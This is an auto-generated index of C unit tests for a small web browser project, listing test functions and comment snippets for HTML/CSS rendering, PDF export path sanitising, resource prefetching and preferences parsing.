- `test_append_undefined_cp1252_is_qmark` (line 161) `static void test_append_undefined_cp1252_is_qmark(void **state)` - *Windows-1252 0x80-0x9F carry printable glyphs (unlike Latin-1 C1 controls): * 0x93/0x94 are curly double quotes -> U+201C/U+201D (3-byte UTF-8 each). static void test_append_transcodes_cp1252_quotes(void **state) { (void)state; pv_view *v = pv_new(); const char cp1252[] = { (char)0x93, 'h', 'i', (char)0x94, '\0' }; assert_int_equal(pv_append(v, PV_TEXT, 0, 0, cp1252, NULL), PV_OK); assert_string_equal(pv_at(v, 0)->text, "\xE2\x80\x9C" "hi" "\xE2\x80\x9D"); pv_free(v); } /* Undefined Windows-1252 positions (0x81 here) have no glyph and still fail to '?'.*
- `test_append_valid_utf8_passthrough` (line 171) `static void test_append_valid_utf8_passthrough(void **state)` - *pv_free(v); } /* Undefined Windows-1252 positions (0x81 here) have no glyph and still fail to '?'. static void test_append_undefined_cp1252_is_qmark(void **state) { (void)state; pv_view *v = pv_new(); const char bad[] = { 'a', (char)0x81, 'b', '\0' }; assert_int_equal(pv_append(v, PV_TEXT, 0, 0, bad, NULL), PV_OK); assert_string_equal(pv_at(v, 0)->text, "a?b"); pv_free(v); } /* Valid multi-byte UTF-8 input passes through untouched (no double-encoding).*
- `test_append_null_args` (line 178) `static void test_append_null_args(void **state)`
- `test_free_null_and_double` (line 186) `static void test_free_null_and_double(void **state)`
- `test_build_null_args` (line 195) `static void test_build_null_args(void **state)` - *pv_view *v = pv_new(); assert_int_equal(pv_append(NULL, PV_TEXT, 0, 0, "x", NULL), PV_ERR_NULL_ARG); assert_int_equal(pv_append(v, PV_TEXT, 0, 0, NULL, NULL), PV_ERR_NULL_ARG); pv_free(v); } static void test_free_null_and_double(void **state) { (void)state; pv_free(NULL); pv_view *v = pv_new(); pv_free(v); } /* --- builder: pv_build ---*
- `test_build_plain_text` (line 204) `static void test_build_plain_text(void **state)`
- `test_build_heading_level` (line 217) `static void test_build_heading_level(void **state)`
- `test_build_inline_emphasis` (line 235) `static void test_build_inline_emphasis(void **state)` - *Inline emphasis: <b>/<strong> set bold, <i>/<em> set italic, on the wrapped run * only; surrounding text stays plain. Nested b>i is both.*
- `test_build_unordered_list` (line 276) `static void test_build_unordered_list(void **state)` - *Unordered list: each <li>'s first run is prefixed with a bullet marker and * carries list depth 1.*
- `test_build_ordered_and_nested_list` (line 294) `static void test_build_ordered_and_nested_list(void **state)` - *assert_int_equal(pv_build(doc, &v), PV_OK); const pv_run *a = find_text(v, "\xE2\x80\xA2 apple"); /* "* apple" assert_non_null(a); assert_int_equal(a->indent, 1); const pv_run *p = find_text(v, "\xE2\x80\xA2 pear"); assert_non_null(p); assert_int_equal(p->indent, 1); pv_free(v); hp_document_free(doc); } /* Ordered list: markers are 1-based ordinals; nested lists deepen the indent.*
- `test_build_table_grid` (line 317) `static void test_build_table_grid(void **state)` - *A table becomes a grid: each cell is one collected text run sharing the table's * cont_id, with the column count = widest row. <th> cells are bold.*
- `test_build_table_flattens_cell` (line 351) `static void test_build_table_flattens_cell(void **state)` - *Cell inner markup is flattened into the cell's text and not re-emitted as a * separate run; the column count comes from the widest row.*
- `test_build_bgcolor_attr_fallback` (line 487) `static void test_build_bgcolor_attr_fallback(void **state)` - *Legacy bgcolor attribute is the background fallback when no CSS background won (like <font color> for the foreground). Hacker News' orange bar and beige page * are bgcolor attributes, not CSS.*
- `test_build_nested_table_not_flattened` (line 502) `static void test_build_nested_table_not_flattened(void **state)`
- `test_build_link_with_href` (line 551) `static void test_build_link_with_href(void **state)`
- `test_build_block_break_between_paragraphs` (line 570) `static void test_build_block_break_between_paragraphs(void **state)`
- `test_build_skips_script_and_style` (line 582) `static void test_build_skips_script_and_style(void **state)`
- `test_build_inline_link_no_break_within_paragraph` (line 596) `static void test_build_inline_link_no_break_within_paragraph(void **state)`
- `test_build_image_with_dims` (line 614) `static void test_build_image_with_dims(void **state)`
- `test_build_image_unknown_dims` (line 631) `static void test_build_image_unknown_dims(void **state)`
- `test_build_image_px_and_tracking_dims` (line 646) `static void test_build_image_px_and_tracking_dims(void **state)`
- `test_build_image_in_skipped_subtree_ignored` (line 668) `static void test_build_image_in_skipped_subtree_ignored(void **state)`
- `test_build_noscript_shown_when_js_off` (line 681) `static void test_build_noscript_shown_when_js_off(void **state)`
- `test_build_noscript_hidden_when_js_on` (line 694) `static void test_build_noscript_hidden_when_js_on(void **state)`
- `test_build_image_without_src_ignored` (line 707) `static void test_build_image_without_src_ignored(void **state)`
- `test_build_image_srcset_fallback_when_no_src` (line 726) `static void test_build_image_srcset_fallback_when_no_src(void **state)` - *An <img> with no plain src but a srcset falls back to the first srcset candidate -- the common shape of responsive-image markup (<picture><source srcset=...> siblings are invisible to this loop; a bare <img srcset=...> with * no src is also common in lazy-loading libraries).*
- `test_build_image_plain_src_wins_over_srcset` (line 742) `static void test_build_image_plain_src_wins_over_srcset(void **state)` - *hp_document *doc = parse( "<body><img srcset=\"https://e.example/a.jpg 1x, https://e.example/b.jpg 2x\" " "alt=\"responsive\"></body>"); pv_view *v = NULL; assert_int_equal(pv_build(doc, &v), PV_OK); const pv_run *img = find_image(v, "https://e.example/a.jpg"); assert_non_null(img); assert_string_equal(img->text, "responsive"); assert_null(find_image(v, "https://e.example/b.jpg")); pv_free(v); hp_document_free(doc); } /* A plain src, when present, always wins over srcset -- no fallback needed.*
- `test_build_image_srcset_single_no_descriptor` (line 757) `static void test_build_image_srcset_single_no_descriptor(void **state)` - *A single srcset candidate with no descriptor at all (just a bare URL) is still * picked up.*
- `test_build_image_srcset_data_url_not_truncated_at_comma` (line 770) `static void test_build_image_srcset_data_url_not_truncated_at_comma(void **state)` - *A data: URI candidate in srcset must not be truncated at its internal * ";base64," comma -- that comma is part of the URL, not a candidate separator.*
- `test_build_image_no_src_and_no_srcset_ignored` (line 785) `static void test_build_image_no_src_and_no_srcset_ignored(void **state)` - *Neither src nor srcset (or an empty/whitespace-only srcset): nothing to show, * same as the existing no-src case.*
- `test_build_empty_document` (line 798) `static void test_build_empty_document(void **state)`
- `test_set_color_model` (line 813) `static void test_set_color_model(void **state)` - *The pure model defaults a run's author color to -1 (none); pv_set_color sets it * on the most recent run and is a safe no-op on an empty view.*
- `test_build_author_color` (line 835) `static void test_build_author_color(void **state)` - *pv_build extracts the author foreground color: inline style "color:" and the legacy <font color>; the nearest ancestor that sets a color wins (inheritance); * background-color is never mistaken for color; an unparseable value yields -1.*
- `test_build_combinator_selectors` (line 882) `static void test_build_combinator_selectors(void **state)` - *Descendant (`div p`) and child (`nav > a`) combinators from a <style> sheet * resolve through the real DOM ancestor chain.*
- `test_build_flex_container` (line 920) `static void test_build_flex_container(void **state)` - *pv_build records the nearest author flex/grid container per run: its id, display, and parsed gap/justify/columns. Runs of one container share the id; a second * container gets a new id; content outside any container has cont_id == -1.*
- `test_build_flex_wrap_align_row_gap` (line 958) `static void test_build_flex_wrap_align_row_gap(void **state)` - *flex-wrap / row-gap / align-items (CONTAINER) + align-self (ITEM) resolve through * the same cascade and thread through the same run fields as the rest of Stage 3.*
- `test_build_flex_item_values` (line 999) `static void test_build_flex_item_values(void **state)` - *Stage 3: each run carries the flex ITEM's own resolved values (the direct child of the container on the run's ancestor chain: grow/shrink/basis x100/px, order) plus the CONTAINER's flex-direction. flex:1 -> 1 1 0. An item without flex properties, an anonymous item (text directly in the container) and content * outside any container keep the unset sentinels.*
- `test_build_float_threading` (line 1062) `static void test_build_float_threading(void **state)` - *float.md: a run inside a floated block carries that block's side + a stable float_id grouping all its runs; two floated siblings get distinct ids; a run outside a float * has float_id == -1; a clear:both block carries its clear.*
- `test_build_flex_whitespace_not_item` (line 1106) `static void test_build_flex_whitespace_not_item(void **state)` - *CSS: whitespace directly inside a flex/grid container creates NO anonymous item (the source newlines between <p> items must not become layout columns). The * flowed-table inter-cell separator is unaffected (it carries cont_id == -1).*
- `test_build_inline_whitespace_kept` (line 1162) `static void test_build_inline_whitespace_kept(void **state)` - *The separator space BETWEEN two inline elements is content, not an anonymous box: * it flows mid-block (no break) and must keep being emitted.*
- `test_build_cont_item_identity` (line 1184) `static void test_build_cont_item_identity(void **state)` - *Container-item identity: inline fragments of the SAME direct child share one cont_item ordinal (they are one flex/grid item and must flow together in one * cell); the next child gets a different ordinal; runs outside carry -1.*
- `test_build_grid_container` (line 1249) `static void test_build_grid_container(void **state)`
- `test_build_grid_columns_from_sheet` (line 1291) `static void test_build_grid_columns_from_sheet(void **state)`
- `test_container_defaults` (line 1331) `static void test_container_defaults(void **state)` - *pv_view *v = NULL; assert_int_equal(pv_build(doc, &v), PV_OK); const pv_run *x = find_text(v, "x"); assert_non_null(x); assert_int_equal(x->cont_display, BX_DISPLAY_FLEX);  /* sheet assert_int_equal(x->cont_gap, 25);                   /* inline wins assert_int_equal(x->cont_justify, FX_JUSTIFY_CENTER);/* sheet pv_free(v); hp_document_free(doc); } /* A run with no flex/grid ancestor carries the no-container defaults.*
- `test_build_box_leaf_inline` (line 1379) `static void test_build_box_leaf_inline(void **state)` - *A leaf block's own box: vertical margins override the UA, horizontal padding + * a fixed width inset and cap the content. No centering without margin:auto.*
- `test_box_defaults_and_setter` (line 1402) `static void test_box_defaults_and_setter(void **state)` - *A run with no author box carries the neutral defaults; pv_set_box fixes the * last run and is NULL-safe.*
- `test_build_boxdeco_border_padding` (line 1432) `static void test_build_boxdeco_border_padding(void **state)` - *pv_view *w = pv_new(); assert_int_equal(pv_append(w, PV_TEXT, 0, 0, "x", NULL), PV_OK); pv_set_box(w, 12, 8, 500, 1, 40, 4); assert_int_equal(pv_at(w, 0)->box_l, 12); assert_int_equal(pv_at(w, 0)->box_r, 8); assert_int_equal(pv_at(w, 0)->box_w, 500); assert_int_equal(pv_at(w, 0)->box_center, 1); assert_int_equal(pv_at(w, 0)->box_mt, 40); assert_int_equal(pv_at(w, 0)->box_mb, 4); pv_set_box(NULL, 0, 0, 0, 0, 0, 0); /* NULL-safe pv_free(w); } /* --- box engine (Hito 23b-8 Step A): identity + box decoration on a run ---*
- `test_build_boxdeco_shadow_outline` (line 1459) `static void test_build_boxdeco_shadow_outline(void **state)`
- `test_build_boxdeco_visibility_overflow_cursor` (line 1482) `static void test_build_boxdeco_visibility_overflow_cursor(void **state)`
- `test_build_cursor_alone_triggers_box` (line 1507) `static void test_build_cursor_alone_triggers_box(void **state)` - *A block that sets ONLY cursor (no other box property) still registers a box: the trigger for a box-def entry must include visibility/overflow/cursor, not just the older border/padding/position set. Box registration is scoped to block-level tags * (like the rest of the box model), so this uses a <div>, not an inline <a>.*
- `test_build_boxdeco_dims_alone_trigger_box` (line 1562) `static void test_build_boxdeco_dims_alone_trigger_box(void **state)` - *2026-07-10: a block that sets ONLY min-width / min-height / max-height / height / aspect-ratio (no other box property) still registers a box: those new box fields extend the box trigger. Box registration is scoped to block-level tags, so the * div is the box-carrying element.*
- `test_build_text_overflow_and_word_break` (line 1607) `static void test_build_text_overflow_and_word_break(void **state)` - *assert_int_equal(bd->box_h, 80); const pv_run *e = find_text(v, "E"); assert_non_null(e); const pv_box_def *be = pv_box_at(v, (size_t)e->block_id); assert_non_null(be); /* aspect-ratio: 16/9 -> num=16000, den=9000 (x1000). assert_int_equal(be->aspect_num, 16000); assert_int_equal(be->aspect_den, 9000); pv_free(v); hp_document_free(doc); } /* text-overflow/word-break inherit like white-space (nearest ancestor wins).*
- `test_build_boxdeco_defaults_no_box` (line 1631) `static void test_build_boxdeco_defaults_no_box(void **state)`
- `test_build_boxdeco_sibling_blocks_distinct_ids` (line 1645) `static void test_build_boxdeco_sibling_blocks_distinct_ids(void **state)`
- `test_build_boxdeco_shared_id_within_block` (line 1663) `static void test_build_boxdeco_shared_id_within_block(void **state)`
- `test_build_box_tree_textless_wrapper` (line 1726) `static void test_build_box_tree_textless_wrapper(void **state)` - *A text-less wrapper (a card whose only child is a body div with the text) owns no run, yet its box def must still exist and be the body box's parent — Step A's * per-run decoration could not represent this.*
- `test_build_box_tree_empty_no_box` (line 1751) `static void test_build_box_tree_empty_no_box(void **state)` - *const pv_box_def *bd = pv_box_at(v, (size_t)body->block_id); assert_non_null(bd); assert_int_equal(bd->pad_t, 9); int card_id = bd->parent_id; assert_true(card_id >= 0); const pv_box_def *card = pv_box_at(v, (size_t)card_id); assert_non_null(card); assert_int_equal(card->bord_tw, 3); assert_int_equal(card->parent_id, -1); pv_free(v); hp_document_free(doc); } /* A page with no author box has an empty box tree (default render byte-identical).*
- `find_input` (line 1763) `static const pv_run *find_input(const pv_view *v, const char *name)` - */* A page with no author box has an empty box tree (default render byte-identical). static void test_build_box_tree_empty_no_box(void **state) { (void)state; hp_document *doc = parse("<body><p>plain</p></body>"); pv_view *v = NULL; assert_int_equal(pv_build(doc, &v), PV_OK); assert_int_equal((int)pv_box_count(v), 0); assert_null(pv_box_at(v, 0)); pv_free(v); hp_document_free(doc); } /* Finds the first PV_INPUT run whose name equals `name`; NULL if none.*
- `test_build_search_form_get` (line 1772) `static void test_build_search_form_get(void **state)` - *pv_free(v); hp_document_free(doc); } /* Finds the first PV_INPUT run whose name equals `name`; NULL if none. static const pv_run *find_input(const pv_view *v, const char *name) { for (size_t i = 0; i < pv_count(v); ++i) { const pv_run *r = pv_at(v, i); if (r->kind == PV_INPUT && r->name != NULL && strcmp(r->name, name) == 0) return r; } return NULL; } /* --- form / input extraction ---*
- `test_build_form_post_and_hidden` (line 1805) `static void test_build_form_post_and_hidden(void **state)`
- `test_build_textarea_value` (line 1839) `static void test_build_textarea_value(void **state)`
- `test_build_control_without_form` (line 1855) `static void test_build_control_without_form(void **state)`
- `test_build_two_forms_distinct_groups` (line 1868) `static void test_build_two_forms_distinct_groups(void **state)`
- `test_build_pseudo_classes_and_siblings` (line 1928) `static void test_build_pseudo_classes_and_siblings(void **state)` - *Pseudo-classes + sibling combinators (Hito 23b-9) resolve through the real pipeline: page_view must feed the css engine each element's sibling context (nth/nsib/prev). Covers the Hacker News idiom a:link{text-decoration:none}, * zebra rows via :nth-child, and the adjacent-sibling combinator.*
- `test_build_table_cell_author_styles` (line 1984) `static void test_build_table_cell_author_styles(void **state)` - *Collected DATA-table cells resolve author styles too (found via --dump-dom: the cell path never called resolve_context, so td{color} / zebra tr:nth-child(even){background} / tr:first-child{font-weight} were silently lost while every non-table run got them). The cell's own style and its * row/table ancestors' inherited style must land on the collected run.*
- `test_build_style_cache_distinct_siblings` (line 2044) `static void test_build_style_cache_distinct_siblings(void **state)` - *Regression for pv_style_cache (page_view.c): resolve_context()/in_hidden_subtree() now memoize cch_element_style() per element pointer so a shared ancestor (here .wrap, walked once per sibling) is resolved once instead of once per descendant. A cache keyed or indexed wrong would leak one sibling's resolved style onto * another; each must keep resolving its OWN class's color.*
- `test_build_text_align_and_font_size` (line 2086) `static void test_build_text_align_and_font_size(void **state)` - *text-align and font-size resolve into the new run fields, from both a <style> * sheet and inline style=.*
- `test_build_text_decoration` (line 2133) `static void test_build_text_decoration(void **state)` - *text-decoration resolves into text_decoration from a <style> sheet and inline * style=, inherits to descendant text, and an inline `none` drops a link underline.*
- `test_build_css_bold_and_inline_wins` (line 2156) `static void test_build_css_bold_and_inline_wins(void **state)` - *pv_view *v = NULL; assert_int_equal(pv_build(doc, &v), PV_OK); assert_int_equal(find_text(v, "struck ")->text_decoration, CSS_DECO_LINE_THROUGH); assert_int_equal(find_text(v, "inherited")->text_decoration, CSS_DECO_LINE_THROUGH); assert_int_equal(find_text(v, "linky")->text_decoration, CSS_DECO_UNDERLINE); assert_int_equal(find_text(v, "plain")->text_decoration, 0); /* none: explicit removal assert_int_equal(find_text(v, "over")->text_decoration, CSS_DECO_OVERLINE); /* An <h3> matched by no rule sets none: unset (-1). assert_int_equal(find_text(v, "plainh")->text_decoration, -1); pv_free(v); hp_document_free(doc); } /* font-weight via CSS sets bold; an inline declaration wins over an id rule.*
- `test_build_display_none_hidden` (line 2175) `static void test_build_display_none_hidden(void **state)` - *"<p class='b'>strongish</p></body>"); pv_view *v = NULL; assert_int_equal(pv_build(doc, &v), PV_OK); const pv_run *t = find_text(v, "t"); assert_non_null(t); assert_int_equal(t->fg_rgb, 0xabcabc); /* inline beats the #x sheet rule const pv_run *s = find_text(v, "strongish"); assert_non_null(s); assert_int_equal(s->bold, 1); /* font-weight:bold from the .b rule pv_free(v); hp_document_free(doc); } /* display:none (inline or from a sheet) hides the element and its whole subtree.*
- `test_build_styled_external_css` (line 2198) `static void test_build_styled_external_css(void **state)` - *External pre-fetched CSS (Hito 27) feeds the same cascade as the document's <style>: an extern rule applies (presentation and display:none alike); at equal specificity the document's own sheet, concatenated after, wins; and a NULL extern is byte-identical to pv_build_full (no-regression lock). page_view stays * pure -- the bytes were fetched by the trusted parent, never here.*
- `test_build_reader_skips_boilerplate` (line 2224) `static void test_build_reader_skips_boilerplate(void **state)` - *Reader (distraction-free) mode skips nav/header/footer/aside boilerplate but * keeps the main article content; with reader off, the boilerplate is kept.*
- `test_set_node_id_model` (line 2252) `static void test_set_node_id_model(void **state)` - *The setter is a no-op when the view is empty or NULL, and it writes to the * most recently appended run otherwise.*
- `test_build_node_id_matches_dom_index` (line 2268) `static void test_build_node_id_matches_dom_index(void **state)` - *Stage 0 keystone: every emitted run carries the document-order element id of its source element, matching the id that dom_build assigns to the same element. This is what lets the GUI dispatch a click on a painted block back * to the worker's live DOM.*
- `test_set_text_style_model` (line 2306) `static void test_set_text_style_model(void **state)`
- `test_build_pointer_events_on_box` (line 2332) `static void test_build_pointer_events_on_box(void **state)` - *pointer-events rides the box-def tree like cursor: a block whose style sets it becomes box-carrying and the def records the value, so the GUI hit-test can * resolve it up the parent chain.*
- `test_build_content_visibility_hidden_folds` (line 2351) `static void test_build_content_visibility_hidden_folds(void **state)` - *content-visibility: hidden folds into the box's visibility (skip paint, keep space) -- the documented visibility:collapse simplification. An explicit * visibility on the same element wins over the fold.*
- `test_build_image_rendering_inherited` (line 2377) `static void test_build_image_rendering_inherited(void **state)` - *image-rendering inherits (nearest ancestor) and is stamped on IMAGE runs so the * painter can pick the nearest-neighbour filter.*
- `test_build_caret_color_inherited` (line 2396) `static void test_build_caret_color_inherited(void **state)` - *caret-color inherits and is stamped on INPUT runs so the painter can tint the * caret of a focused control. auto/unset stays -1.*
- `test_append_video_copies_fields` (line 2419) `static void test_append_video_copies_fields(void **state)` - *for (size_t i = 0; i < pv_count(v); ++i) { if (pv_at(v, i)->kind != PV_INPUT) continue; if (in1 == NULL) in1 = pv_at(v, i); else if (in2 == NULL) in2 = pv_at(v, i); } assert_non_null(in1); assert_non_null(in2); assert_int_equal(in1->caret_color, 0xff0000); assert_int_equal(in2->caret_color, -1); pv_free(v); hp_document_free(doc); } /* --- video model tests ---*
- `test_append_video_no_poster` (line 2438) `static void test_append_video_no_poster(void **state)`
- `test_append_video_null_args` (line 2454) `static void test_append_video_null_args(void **state)`
- `test_build_video_with_source` (line 2464) `static void test_build_video_with_source(void **state)`
- `test_build_video_uses_source_child` (line 2483) `static void test_build_video_uses_source_child(void **state)`
- `test_build_video_without_src_ignored` (line 2500) `static void test_build_video_without_src_ignored(void **state)`
- `test_build_audio_as_video_kind` (line 2511) `static void test_build_audio_as_video_kind(void **state)`
- `main` (line 2525) `int main(void)`

#### `test_pdf_export.c`
**Path:** `tests/test_pdf_export.c`

**Functions:**
- `pagination` (line 8) `* deterministic pagination (single/multi page, no row splitting, oversized row,
 * gap preservati...`
- `test_basename_maps_spaces_and_reserved` (line 30) `static void test_basename_maps_spaces_and_reserved(void **state)`
- `test_basename_rejects_path_separators` (line 38) `static void test_basename_rejects_path_separators(void **state)`
- `test_basename_neutralizes_traversal` (line 48) `static void test_basename_neutralizes_traversal(void **state)`
- `test_basename_dotdot_only_falls_back` (line 56) `static void test_basename_dotdot_only_falls_back(void **state)`
- `test_basename_trims_edges` (line 63) `static void test_basename_trims_edges(void **state)`
- `test_basename_collapses_underscores` (line 71) `static void test_basename_collapses_underscores(void **state)`
- `test_basename_control_bytes_mapped` (line 78) `static void test_basename_control_bytes_mapped(void **state)`
- `test_basename_non_ascii_mapped` (line 86) `static void test_basename_non_ascii_mapped(void **state)`
- `test_basename_empty_and_null_fall_back` (line 95) `static void test_basename_empty_and_null_fall_back(void **state)`
- `test_basename_all_separators_fall_back` (line 104) `static void test_basename_all_separators_fall_back(void **state)`
- `test_basename_length_bound` (line 111) `static void test_basename_length_bound(void **state)`
- `test_basename_null_out_and_zero_size` (line 122) `static void test_basename_null_out_and_zero_size(void **state)`
- `test_basename_overflow_fails_closed` (line 129) `static void test_basename_overflow_fails_closed(void **state)`
- `test_build_path_basic` (line 138) `static void test_build_path_basic(void **state)` - *(void)state; char out[8]; assert_int_equal(pe_safe_basename("x", NULL, sizeof out), PE_ERR_NULL_ARG); assert_int_equal(pe_safe_basename("x", out, 0), PE_ERR_NULL_ARG); } static void test_basename_overflow_fails_closed(void **state) { (void)state; char out[3]; /* too small for "page" (fallback) too assert_int_equal(pe_safe_basename("hello", out, sizeof out), PE_ERR_OVERFLOW); assert_string_equal(out, ""); /* no partial name } /* --- pe_build_path ---*
- `test_build_path_trailing_slash` (line 145) `static void test_build_path_trailing_slash(void **state)`
- `test_build_path_hostile_title_contained` (line 152) `static void test_build_path_hostile_title_contained(void **state)`
- `test_build_path_empty_title_fallback` (line 161) `static void test_build_path_empty_title_fallback(void **state)`
- `test_build_path_overflow_fails_closed` (line 168) `static void test_build_path_overflow_fails_closed(void **state)`
- `test_build_path_null_args` (line 175) `static void test_build_path_null_args(void **state)`
- `test_build_path_ext_png` (line 185) `static void test_build_path_ext_png(void **state)` - *char out[16]; assert_int_equal(pe_build_path("/a/very/long/dir", "name", out, sizeof out), PE_ERR_OVERFLOW); assert_string_equal(out, ""); } static void test_build_path_null_args(void **state) { (void)state; char out[64]; assert_int_equal(pe_build_path(NULL, "x", out, sizeof out), PE_ERR_NULL_ARG); assert_int_equal(pe_build_path("/tmp", "x", NULL, sizeof out), PE_ERR_NULL_ARG); assert_int_equal(pe_build_path("/tmp", "x", out, 0), PE_ERR_NULL_ARG); } /* --- pe_build_path_ext (PNG and other extensions) ---*
- `test_build_path_ext_null_ext` (line 193) `static void test_build_path_ext_null_ext(void **state)`
- `test_build_path_ext_hostile_title_contained` (line 201) `static void test_build_path_ext_hostile_title_contained(void **state)`
- `test_build_path_ext_overflow_fails_closed` (line 212) `static void test_build_path_ext_overflow_fails_closed(void **state)`
- `test_paginate_single_page` (line 222) `static void test_paginate_single_page(void **state)` - *PE_EXT_PNG, out, sizeof out), PE_OK); assert_string_equal(out, "/safe/dir/etc_passwd.png"); assert_null(strstr(out + strlen("/safe/dir"), "..")); } static void test_build_path_ext_overflow_fails_closed(void **state) { (void)state; char out[16]; assert_int_equal(pe_build_path_ext("/a/very/long/dir", "name", PE_EXT_PNG, out, sizeof out), PE_ERR_OVERFLOW); assert_string_equal(out, ""); } /* --- pe_paginate ---*
- `test_paginate_breaks_without_splitting` (line 237) `static void test_paginate_breaks_without_splitting(void **state)`
- `test_paginate_oversized_row_not_split` (line 251) `static void test_paginate_oversized_row_not_split(void **state)`
- `test_paginate_preserves_gaps` (line 263) `static void test_paginate_preserves_gaps(void **state)`
- `test_paginate_invalid_args` (line 275) `static void test_paginate_invalid_args(void **state)`
- `main` (line 289) `int main(void)`

#### `test_prefetch.c`
**Path:** `tests/test_prefetch.c`
**File Doc:** *Tests for prefetch (Hito 29): pure lookahead scanner + parallel download pool.*

**Functions:**
- `test_scan_null_args` (line 21) `static void test_scan_null_args(void **state)` - *#include <stdarg.h> #include <stddef.h> #include <setjmp.h> #include <stdint.h> #include <cmocka.h> #include <pthread.h> #include <stdlib.h> #include <string.h> #include <stdio.h> #include "prefetch.h" /* --- scanner -----------------------------------------------------------*
- `test_scan_basic_stylesheet_and_script` (line 31) `static void test_scan_basic_stylesheet_and_script(void **state)`
- `test_scan_ref_cap` (line 104) `static void test_scan_ref_cap(void **state)` - *(void)state; const char *html = "<!-- <link rel=stylesheet href=commented.css> -->" "<script>document.write('<link rel=stylesheet href=fromjs.css>');</script>" "<style>/* <script src=instyle.js></script> */</style>" "<link rel=stylesheet href=real.css>"; pf_list l; assert_int_equal(pf_scan(html, strlen(html), &l), 0); assert_int_equal(l.count, 1); assert_string_equal(l.refs[0].url, "real.css"); pf_list_free(&l); } /* Bounded: refs past PF_MAX_REFS are dropped, never overflowed.*
- `fake_fetch` (line 134) `static int fake_fetch(void *vctx, const char *method, const char *url,
                      cons...`
- `test_pool_parallel_fetch_and_take` (line 152) `static void test_pool_parallel_fetch_and_take(void **state)`
- `test_pool_miss_consume_and_failure` (line 184) `static void test_pool_miss_consume_and_failure(void **state)`
- `test_pool_finish_unconsumed_and_empty` (line 228) `static void test_pool_finish_unconsumed_and_empty(void **state)` - *finish() with results nobody took must free them all (ASan-verified) and be * idempotent. An empty pool is a no-op that reports -1 from start.*
- `test_pooled_fetch_adapter` (line 249) `static void test_pooled_fetch_adapter(void **state)` - *The shared cache-first adapter: pooled GETs hit the pool, everything else * (POST, miss, no pool) falls through to the inner fetcher exactly once.*
- `main` (line 288) `int main(void)`

**Macros:**
- `_POSIX_C_SOURCE` (line 4)

**Structs:**
- `fake_ctx` (line 126) - *Deterministic fake fetcher: body echoes the URL so take() can verify the per-URL mapping; a barrier proves REAL concurrency (the test only passes if * PF_MAX_THREADS fetches are simultaneously inside the callback).*

#### `test_prefs.c`
**Path:** `tests/test_prefs.c`

**Functions:**
- `test_init_defaults` (line 24) `static void test_init_defaults(void **state)` - *#include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <setjmp.h> #include <string.h> #include <cmocka.h> #include "prefs.h" #include "zoom.h" /* --- defaults ------------------------------------------------------------*
- `test_roundtrip` (line 49) `static void test_roundtrip(void **state)` - *assert_int_equal(p.tor, 0); assert_int_equal(p.i2p, 0); assert_int_equal(p.torify, 0); assert_int_equal(p.zoom_pct, 100); assert_int_equal(p.remember_history, 1); assert_int_equal(p.bookmarks_len, 0); assert_int_equal(p.history_len, 0); prefs_free(&p); prefs_free(&p);   /* idempotent prefs_init(NULL); /* NULL-safe prefs_free(NULL); } /* --- round-trip -----------------------------------------------------------*
- `test_parse_bad_magic` (line 109) `static void test_parse_bad_magic(void **state)` - *assert_string_equal(q.bookmarks[0].url, "https://example.com/a"); assert_string_equal(q.bookmarks[0].title, "Example A"); assert_string_equal(q.bookmarks[1].url, "https://example.org/b"); assert_string_equal(q.bookmarks[1].title, ""); assert_int_equal(q.history_len, 2); assert_string_equal(q.history[0], "https://two.test/");  /* most recent first assert_string_equal(q.history[1], "https://one.test/"); free(text); prefs_free(&p); prefs_free(&q); } /* --- parse: fail closed / forward compat ----------------------------------*
- `test_parse_too_large` (line 125) `static void test_parse_too_large(void **state)`
- `test_parse_unknown_and_malformed_skipped` (line 134) `static void test_parse_unknown_and_malformed_skipped(void **state)`
- `test_parse_clamps_out_of_range` (line 156) `static void test_parse_clamps_out_of_range(void **state)`
- `test_invalid_urls_rejected` (line 178) `static void test_invalid_urls_rejected(void **state)` - *"js=7\n" "zoom=9999\n" "images=5\n" "tor=-3\n"; assert_int_equal(prefs_parse(text, strlen(text), &p), PREFS_OK); assert_int_equal(p.theme_mode, 0);            /* out of range -> safe default assert_int_equal(p.js_mode, 1);               /* out of range -> allowlist assert_int_equal(p.zoom_pct, zm_clamp(9999)); /* the ladder owns the bounds assert_int_equal(p.images, 1);                /* nonzero -> 1 assert_int_equal(p.tor, 1); prefs_free(&p); } /* --- URL validation (fail closed) ------------------------------------------*
- `test_hostile_title_cleaned` (line 206) `static void test_hostile_title_cleaned(void **state)` - *PREFS_ERR_INVALID); char big[PREFS_MAX_URL + 8]; memset(big, 'a', sizeof big - 1); big[sizeof big - 1] = '\0'; assert_int_equal(prefs_bookmark_toggle(&p, big, "t", &added), PREFS_ERR_INVALID); assert_int_equal(prefs_history_add(&p, "no\x7f" "del"), PREFS_ERR_INVALID); assert_int_equal(p.bookmarks_len, 0); assert_int_equal(p.history_len, 0); /* A local path with a space IS representable (tab-separated format is safe). assert_int_equal(prefs_history_add(&p, "docs/my page.html"), PREFS_OK); prefs_free(&p); } /* --- hostile titles are cleaned, never fatal --------------------------------*
- `test_bookmark_toggle_and_cap` (line 236) `static void test_bookmark_toggle_and_cap(void **state)` - *long_title[n++] = (char)0xA1; } long_title[n] = '\0'; assert_int_equal(prefs_bookmark_toggle(&p, "https://y.test/", long_title, &added), PREFS_OK); const char *kept = p.bookmarks[1].title; size_t klen = strlen(kept); assert_true(klen <= PREFS_MAX_TITLE); assert_true(klen > 0); assert_true(klen % 2 == 0);  /* whole 2-byte sequences only prefs_free(&p); } /* --- bookmark toggle ----------------------------------------------------------*
- `test_history_dedup_and_evict` (line 264) `static void test_history_dedup_and_evict(void **state)` - *assert_int_equal(p.bookmarks_len, 0); char url[64]; for (size_t i = 0; i < PREFS_MAX_BOOKMARKS; ++i) { snprintf(url, sizeof url, "https://cap.test/%zu", i); assert_int_equal(prefs_bookmark_toggle(&p, url, "t", &added), PREFS_OK); } assert_int_equal(p.bookmarks_len, PREFS_MAX_BOOKMARKS); assert_int_equal(prefs_bookmark_toggle(&p, "https://cap.test/full", "t", &added), PREFS_ERR_FULL); prefs_free(&p); } /* --- history dedup / move-to-front / eviction ----------------------------------*
